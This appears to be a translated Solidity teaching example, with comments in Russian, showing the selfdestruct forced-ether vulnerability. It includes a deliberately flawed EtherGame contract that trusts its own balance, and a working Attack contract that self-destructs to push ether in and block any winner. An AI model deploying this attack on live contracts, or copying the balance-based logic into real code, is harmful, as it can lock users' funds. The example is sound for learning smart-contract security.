/*
Саморазрушение
Контракты можно удалить из блокчейна, вызвав selfdestruct.

selfdestruct отправляет весь оставшийся эфир, хранящийся в контракте, на указанный адрес.

Уязвимость
Вредоносный контракт может использовать 
самоуничтожение для принудительной отправки эфира на любой контракт.
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// Цель этой игры — стать седьмым игроком, внесшим 1 эфир.
// Игроки могут вносить только 1 эфир за раз.
// Победитель сможет вывести весь эфир.

/*
1. Разверните EtherGame
2. Игроки (скажем, Алиса и Боб) решают сыграть, вносят по 1 эфиру каждый.
2. Развернуть атаку с адресом EtherGame
3. Call Attack.attack отправив 5 эфиров. Это сломает игру
    Никто не может стать победителем.

Что случилось?
Атака довела баланс EtherGame до 7 эфиров.
Теперь никто не может внести депозит, и победитель не может быть установлен.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // Можно просто сломать игру, отправив эфир, чтобы
         // баланс игры >= 7 эфиров

         // приводим адрес к payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
